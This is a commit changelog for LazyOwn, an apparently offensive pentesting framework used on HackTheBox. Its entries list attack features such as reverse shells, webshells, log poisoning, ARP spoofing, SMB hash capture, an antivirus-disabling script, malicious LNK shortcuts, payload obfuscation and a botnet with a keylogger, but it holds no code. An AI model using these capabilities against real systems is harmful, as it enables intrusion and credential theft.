  *   * hotfix(fix in vpn): dont work with arguments\n\nnow works xD\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Otros

### Otros

  *   * feature(parametrizar el despliegue): se agrega el parametro --no-test para despliegues que no involucren cambios en la tool\n\n:D\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(troubleshooting): deleting the tmp file but i cant sleep\n\nlol\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Correcciones urgentes

### Otros

  *   * hotfix(delete qa command to option -c): bug: dont let beggin scriptfast_run_as_r00t.sh, instruction was deleted\n\nat line 6678\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(despliegue): backup file del archivo lazyown creado en las pruebas TODO: eliminar el archivo al terminar las pruebas, ahora toca saber donde lo està creadno son muchas funciones xD, aun que creoq ue es mi pequeño burpfuzzer que lo hace pero ya es tarde\n\ny no lo veré hoy\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(despliegue): de organizaciòn de archivos ovpn dentro del directorio vpn\n\ntambien se actualizo el timeout de las pruebas unitarias\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Pruebas

### Otros

  *   * test(testmeneitor): probando el workflow de despliegue\n\neste es el body de la prueba de despliegue junto a testmineitor\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Otros

### Otros

  *   * feature(nuevo creador de index.html): crea el html de manera automatizada con el script index.sh\n\nel script realiza tareas de actualizaciòn de la pagina web\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Otros

### Otros

  *   * feature(mejora CHANGELOG.sh): ahora actualiza usando readmeneitor.py\n\npronto utilizarà nuestro testmeneitor para probar que no subimos codigo con bugs\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Nuevas características

### Otros

  *   * feat(mejorando el tipo): cambio en el script CHANGELOG.sh\n\nse mejora la descripcion de los tipos de commits\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Documentación

### Otros

  *   * docs(docs): El cierre de una imagen en la documentación estaba mal :)\n\ntambien se modifico el CHANGELOG.sh que chulada de script\n\n👽 LazyOwn on HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽  https://www.reddit.com/r/LazyOwn/   👽  https://grisuno.github.io/LazyOwn/


### Otros

### Otros

  *   * Nueva descripcion en el readme y probando el CHANGELOG.sh :)


### Otros

### Otros

  *   * ahora el changelog a docs :D en formato html


### Otros

### Otros

  *   * HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 Ahora estamos en TryHackMe :D, nuestro QA Testmeneitor.py ya es màs inteligente ya no se le olvida cerrar las tareas que abrio xD, todos los comandos nuevos estan docuemntados en docs/COMMANDS.md y docs/UTILS.md todas las funciones nuevas como copy2clip :P, y estrenamos CHANGELOG.md y CHANGELOG.sh :D  👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 some changes in the web  pandoc README.md -f markdown -t html -s -o README.html madremia que comandazo 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 some changes in the web  pandoc README.md -f markdown -t html -s -o README.html madremia que comandazo 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 some changes in the web  👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 comming soon tryhackme 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 testmeneitor.py my new qa it's new doing qa so... l:P, some commands news base64encode, base64decode, rdp, all documented by my documentator readmeneitor.py :P 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 new fancy proompt :) 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 bug fixing 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 3ast3r366 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New commands documented at COMMANDS.md and new ultis documented at ULTIS.md 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New command launchpad to recon Linux OS 👽


### Otros

### Otros

  *   * Merge pull request #27 from grisuno/clcthulhu-patch-1


### Documentación

### Otros

  *   * docs(update readme description): change of the description; Update README.md


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 New Machine, New Session, New Look, New functions, New tools, New CVEs, NEW VERSION  👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 mejorando la documentaciòn 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 new commands rulencode, urldecode, y lynis documented at COMMANDS.md 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 command vpn now handle multiple ovpn files 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 command vpn now handle multiple ovpn files 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  👽 new commands documented at COMMANDS.md, now implement autocomplete at hashcat, more soon :) 👽


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  new commands documented at COMMANDS.md


### Otros

### Otros

  *   * 👽 HackTheBox: https://app.hackthebox.com/teams/overview/6429  Magicgardens is so insane but pwned :)


### Otros

### Otros

  *   * 👽 new commands documented in COMMANDS.md or README.md and more documentation of the proyect thanks to readmineitor.py :D comming soon their own repo...


### Otros

### Otros

  *   * 👽 new commands documented in COMMANDS.md or README.md and more documentation of the proyect thanks to readmineitor.py :D comming soon their own repo...


### Otros

### Otros

  *   * 👽 new machine magic gardens insane machine because resource was pwned and sea not was released yet


### Otros

### Otros

  *   * 👽 bug fixing in createhash, new wrappers, chisel command updated now can choice the payload, img2cookie new payloads


### Otros

### Otros

  *   * 👽 bug fixing in createhash, new wrappers, chisel command updated now can choice the payload, img2cookie new payloads


### Otros

### Otros

  *   * 👽 some love to readme


### Otros

### Otros

  *   * 👽 some love to readme


### Otros

### Otros

  *   * 👽 some love to readme


### Otros

### Otros

  *   * 👽 new tools for pwntomate :D


### Otros

### Otros

  *   * 👽 new command img2cookie :)


### Otros

### Otros

  *   * 👽 new command img2cookie :)


### Otros

### Otros

  *   * 👽 new machine comprezzor.htb


### Otros

### Otros

  *   * 👽 new script readmeneitor req updated


### Otros

### Otros

  *   * 👽 new script readmeneitor to help me update the readme xD


### Otros

### Otros

  *   * 👽 new command ssh 22 and if u have file sessions/credentials.txt this will open ssh conection :)


### Otros

### Otros

  *   * 👽 bug fixing and replace command nc with pwncatcs more fancy and sharp :)


### Otros

### Otros

  *   * 👽 bug fixing in wfuzz sub command wen you not pass the domain


### Otros

### Otros

  *   * 👽 some changes in nmap script now discovery have template html too and we have a little index2.html to navigate the reports.


### Otros

### Otros

  *   * 👽 some littles changes :)


### Otros

### Otros

  *   * 👽 new machine compiled :)


### Otros

### Otros

  *   * 👽 new command disableav to create a aav.vbs to disable av if it's possible :)


### Otros

### Otros

  *   * 👽 changing the command in venom :)


### Otros

### Otros

  *   * 👽 holly jissus mist.htb now pwned with my user :P its rally insane amount of work to pwn


### Otros

### Otros

  *   * 👽 holly jissus mist.htb machine cost to me one week and my mental health xD bu it's pwned xD


### Otros

### Otros

  *   * 👽 todo readme ...


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * 👽 update gitignore ...


### Otros

### Otros

  *   * 👽 chisel fix copy to clipboard commad bug ...


### Otros

### Otros

  *   * 👽 command list to update the readme: todo ...


### Otros

### Otros

  *   * 👽 no more prints ( 👽 we have 13 xD) now we have technologì we have print_msg, print_error & print_warn :) so much pretty


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * 👽 better prints 👽


### Otros

### Otros

  *   * 👽 conptyshell better 👽


### Otros

### Otros

  *   * 👽 new brothers commands, LazyOwn> winbase64payload  and asprevbase64 👽


### Otros

### Otros

  *   * some roder to prints, not finished yet but the storm its cut the electricity so commit....


### Otros

### Otros

  *   * feat: somo testing and alias now you can run gpt alias :D


### Otros

### Otros

  *   * feat: Now the GPT Client use Llama 70B and now can hack :) fixing error path from json files :P


### Otros

### Otros

  *   * feat: Now the GPT Client use Llama 70B and now can hack :)


### Otros

### Otros

  *   * feat: more time to the nmap to finished and pyautomate autostart


### Otros

### Otros

  *   * feat: New stylesheet for Nmap reports, making them more professional and including links to CVEs according to the version of banner services and supper fast automate auto run script as fast_run_as_r00t.sh, demo soon


### Otros

### Otros

  *   * Create sessions.sh


### Otros

### Otros

  *   * some new attacks exploits and new menu to download resources and exploits :D new msf autoroute :D


### Otros

### Otros

  *   * some new attacks exploits and new menu to download resources adn exploits :D


### Otros

### Otros

  *   * some new attacks


### Otros

### Otros

  *   * some ideas


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 command smbserver now create file.scf to generate a attackto the victim try to charge an iccon from our smbserver and the hash is ours


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command getnpusers


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅 alias auto.


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅 alias auto.


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 the target was pwntomated 🍅. jejejjejej


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 now with pwntomate to automate with the command pyautomate


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 now command nmap or run lazynmap has a html and xml reports to more pleasssure. xD


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command chisel to run chisel as server before run download_resource command


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 socat command to use proxychains :D and better msf rev now with argument [win|win64|lin|lin64|mac|mac64] and command msf lnk [win|win64] to perform a malicious shortcut lnk attack with msfvenom


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some format....


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 ...


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 fix arguments little bug


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 fix arguments little bug


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new arguments :) -c command ex ping


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new aliases :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 now options like --help, -v and --no-banner :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command clock to see the time of the eternal now :) now in white xD


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command clock to see the time of the eternal now :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 newhashcat


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new comands conptyshell better command nc noew with tty treatment createhash better now with recognice automate download_resource


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 another account and i noob again bu i steel playing insane mist machine and if not unban so i can unlck my writeups and spoiler spoiler spoiler alert xD


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 was banned from htb to spoiler jajjajaj xD


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 msf command


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 scripts to try attac cammeras not work with my cammera yet xD


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 scripts to try attac cammeras not work with my cammera yet xD


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ignorearp ignoreicmp acknowledgearp acknowledgeicmp ports cports


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 clean command to clean up the mess and pwn the next machine :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 wfuzz commands pwd, sh


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 wfuzz command now search subdomains with wfuzz sub domain.htb new commands nc, vpn, rev, banner :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New Colors :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 adding run script to run lazyown with virtual env activated to avoid errors


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 adding alias to exit as q :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 adding alias to commands its una shulada


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some love to list command :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some love in form of colored strings :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 some love to some prints :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command py3ttyup to upgrade to tty your rev shell :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ip www to show ips and start webserver at sessions directory where lazyown dump scripts like revertshells, webshells, etc. and some fixperms :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands ip www to show ips and start webserver at sessions directory where lazyown dump scripts like revertshells, webshells, etc.


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 solarlab pwned :D new machine MagicGardens


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine solarlab :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new revshell.c and machine powned xD axlle hard


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new commands createrevshell y createwinrevshell


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 FormulaX pwned :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Freelancer Pwned :P new new new FormulaX :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Freelancer :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Skyfall Linux insane machine, Blazorized was powned :D


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Blazorized.htb


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Greenhorn.htb pwned


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new machine Greenhorn.htb


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new tool in external :) https://github.com/BloodHoundAD/SharpHound.git :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new MAchine Blazorized.htb :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new MAchine :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command to copy the exploits from exploitdb use cp relative/path/show/in/searchexploit when you use the flag -x :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command dsnmap :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New machine Runner.htb


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command :) new resources in sessions, new module lazypsexec bruteforce :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 New command :) samrdump


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 news script bruteforce on modules :) :)


### Otros

### Otros

  *   * HackTheBox https://app.hackthebox.com/teams/overview/6429 new command dnsenum :)


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new command dig


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new command dig


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new commands :)


### Otros

### Otros

  *   * Update lazyproxy.py


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 new commands :) to se use tab tab or ?


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 and new payloads in sessions directory :) :) :)


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 and new exploits :)


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429 and new command run lazywerkzeugdebug


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429


### Otros

### Otros

  *   * join to our team https://app.hackthebox.com/teams/overview/6429


### Otros

### Otros

  *   * news exploits


### Otros

### Otros

  *   * new hashcat :D


### Otros

### Otros

  *   * new command dirsearch :D


### Otros

### Otros

  *   * new proxy better :D


### Otros

### Otros

  *   * new commands createhash, createwebshell, sqlmap, proxy, john2hash


### Otros

### Otros

  *   * little discover .sh


### Otros

### Otros

  *   * Create internal_discover.sh


### Otros

### Otros

  *   * 1 new exploit


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * 2 new exploit external :D working like a charm


### Otros

### Otros

  *   * new exploit werkzeug in debug mode lettle retocated to run in python3 from searchsploit :D


### Otros

### Otros

  *   * new command: exploits externals :D


### Otros

### Otros

  *   * new command: smbmap whattomap ex: smbmap tmp :D


### Otros

### Otros

  *   * go buster new parameter url to use url from payload not rhost


### Otros

### Otros

  *   * parameter added to gospider url to use var url in payload not rhost and add the command addhost host.ext to add the domain with rhost parameter to /etc/hosts not now to windows sistems sorry


### Otros

### Otros

  *   * refactor global var rhost deleted other ones


### Otros

### Otros

  *   * path hijacking add line to temp bash script


### Otros

### Otros

  *   * new command: gospider :D


### Otros

### Otros

  *   * new command: gobuster :D


### Otros

### Otros

  *   * new command: wfuzz :D and you can add example a hide line option like # wfuzz --hl=9 to hide responses with long line to 9


### Otros

### Otros

  *   * new command: run lazyssh77enum to enum using a wordlist and exploit foound searchsploit as openssh 7.7


### Otros

### Otros

  *   * new command: whatweb :D


### Otros

### Otros

  *   * new command: psexec :D


### Otros

### Otros

  *   * smbclient command and exploit to enum ssh i used in a machine of hackthebox to enum, i upload because i was lazy and dont deleted before xD


### Otros

### Otros

  *   * Merge pull request #22 from grisuno/grisuno-patch-1


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * mariadb rce :)


### Otros

### Otros

  *   * new command getseclist :D


### Otros

### Otros

  *   * payload.json to play on hackthebox :D


### Otros

### Otros

  *   * port a python del exploit archiconocido de meta exploit vsftpd 3.0.3


### Otros

### Otros

  *   * shell payload in python generated by msfvenom automated by lazyown framework ;)


### Otros

### Otros

  *   * new commit to check if alsr is activated in the kernel


### Otros

### Otros

  *   * deleted shells generated by the script


### Otros

### Otros

  *   * upx to shells generated by msfvenom automated by lazyown framework ;)


### Otros

### Otros

  *   * new comand arpscan


### Otros

### Otros

  *   * new path to diccionary to run by default in parrot


### Otros

### Otros

  *   * new gitignore


### Otros

### Otros

  *   * cambios en el miniburp


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update install.sh


### Otros

### Otros

  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)


### Otros

### Otros

  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)


### Otros

### Otros

  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)


### Otros

### Otros

  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)


### Otros

### Otros

  *   * herramienta para ofuscar payloads y es usada en lazylogpoisoner ;) pronto extendida al resto de payloads ;)


### Otros

### Otros

  *   * lazymitmap.py


### Otros

### Otros

  *   * lazymitmap.py


### Otros

### Otros

  *   * lazymitmap.py


### Otros

### Otros

  *   * Update lazycurl.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * lazycurl.sh


### Otros

### Otros

  *   * Update install.sh


### Otros

### Otros

  *   * Update requirements.txt


### Otros

### Otros

  *   * Merge pull request #21 from grisuno/grisuno-patch-1


### Otros

### Otros

  *   * Update CNAME


### Otros

### Otros

  *   * Update install.sh


### Otros

### Otros

  *   * Create CNAME


### Otros

### Otros

  *   * metatags to seo


### Otros

### Otros

  *   * Lazy ntlmv2 firstaproach using in hashes.txt the ouput smbserver command when the conection is established


### Otros

### Otros

  *   * Lazy .gitignore


### Otros

### Otros

  *   * Lazy get smbserver with impacket :) and then you can sudo impacket-smbserver smbfolder /home/gris/tools/LazyOwn -smb2support with simple smbserver in LazyOwn console


### Otros

### Otros

  *   * LAzy get capabilities :P


### Otros

### Otros

  *   * LazyOwn FTP sniff prety messages :)


### Otros

### Otros

  *   * LazyOwn keygen to generate keys to use in payload.json to cypher the conections


### Otros

### Otros

  *   * LazyOwn smbrelay


### Otros

### Otros

  *   * LazyOwn http sniff :( not working fine yet


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * LazyOwn ftp sniff :)


### Otros

### Otros

  *   * LazyOwn README


### Otros

### Otros

  *   * LazyOwn ArpSpoofing README and banner :P [;,;]


### Otros

### Otros

  *   * LazyOwn ArpSpoofing [;,;]


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Lazy path hijacking :)


### Otros

### Otros

  *   * Lazy msfvenom reverse :)


### Otros

### Otros

  *   * Lazy Log more lfi list :)


### Otros

### Otros

  *   * Lazy Log Poisonig more poison bro


### Otros

### Otros

  *   * Lazy Log Poisonig in ssh first aproach


### Otros

### Otros

  *   * Lazy Log Poisonig


### Otros

### Otros

  *   * Lazy Log Poisonig


### Otros

### Otros

  *   * Lazy Log Poisonig


### Otros

### Otros

  *   * Delete lazylogpisoning.py


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Lazy Log Poisonig


### Otros

### Otros

  *   * fix install


### Otros

### Otros

  *   * Update lazypwnkit.py


### Otros

### Otros

  *   * Create lazyssh.py


### Otros

### Otros

  *   * #!/usr/bin/env python3  #_*_ coding: utf8 _*_


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * add #!/usr/bin/env python3  #_*_ coding: utf8 _*_


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update lazylfi2rce.py


### Otros

### Otros

  *   * dic


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * dos2unix


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * better implementation


### Otros

### Otros

  *   * tentativas de herramientas nuevas


### Otros

### Otros

  *   * google analytics


### Otros

### Otros

  *   * dos2unix


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * Update .gitignore


### Otros

### Otros

  *   * delete python librarys


### Otros

### Otros

  *   * use of python3 env


### Otros

### Otros

  *   * use of python3 env


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * Update index.html


### Otros

### Otros

  *   * banner


### Otros

### Otros

  *   * nueva shell zsh :)


### Otros

### Otros

  *   * index nuevo


### Otros

### Otros

  *   * Create index.html


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * imlementacion de libreria pwn


### Otros

### Otros

  *   * new tags


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * Create lazygalazy.py


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Create lazyclonewars.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * Update lazywebshell.sh


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Create lazywebshell.sh


### Otros

### Otros

  *   * mejora en la webshell de python


### Otros

### Otros

  *   * webshells


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * comentarios necesarios


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * return jsonify({"error": "error"}), 500


### Otros

### Otros

  *   * Fix code scanning alert - Information exposure through an exception #16


### Otros

### Otros

  *   * Fix code scanning alert - Flask app is run in debug mode #17


### Otros

### Otros

  *   * py2elf experimental


### Otros

### Otros

  *   * nueva interfaz web experimental


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * nuevo bot de investigacion


### Otros

### Otros

  *   * remove keys xD


### Otros

### Otros

  *   * new honeypot


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * New BotNet with Keylogger


### Otros

### Otros

  *   * Merge pull request #13 from grisuno/grisuno-patch-7


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create pull_request_template.md


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Create pull_request_template.md


### Otros

### Otros

  *   * device to sniff parametric


### Otros

### Otros

  *   * netbios atack


### Otros

### Otros

  *   * Update lazynetbios.py


### Otros

### Otros

  *   * update req*


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * new netbios atack mode


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * del


### Otros

### Otros

  *   * mejoras en ncurses


### Otros

### Otros

  *   * Update lazysniff.py


### Otros

### Otros

  *   * nuevo modulo de sniffer


### Otros

### Otros

  *   * Update lazyownclient.py


### Otros

### Otros

  *   * Merge branch 'main' of https://github.com/grisuno/LazyOwn


### Otros

### Otros

  *   * new command fixperm


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * nuevo modulo de gathering


### Otros

### Otros

  *   * Update search.py


### Otros

### Otros

  *   * new comand payload :)


### Otros

### Otros

  *   * nueva estructura de directorios


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update lazyownserver.py


### Otros

### Otros

  *   * Merge pull request #10 from grisuno/grisuno-patch-6


### Otros

### Otros

  *   * Update lazyownclient.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update requirements.txt


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Create lazyownclient.py


### Otros

### Otros

  *   * Create lazyownserver.py


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Update README.md


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Update lazynmap.sh


### Otros

### Otros

  *   * Update requirements.txt


### Otros

### Otros

  *   * Update app.py


### Otros

### Otros

  *   * Merge pull request #8 from grisuno/grisuno-patch-6


### Otros

### Otros

  *   * Update requirements.txt


### Otros

### Otros

  *   * Update README.md
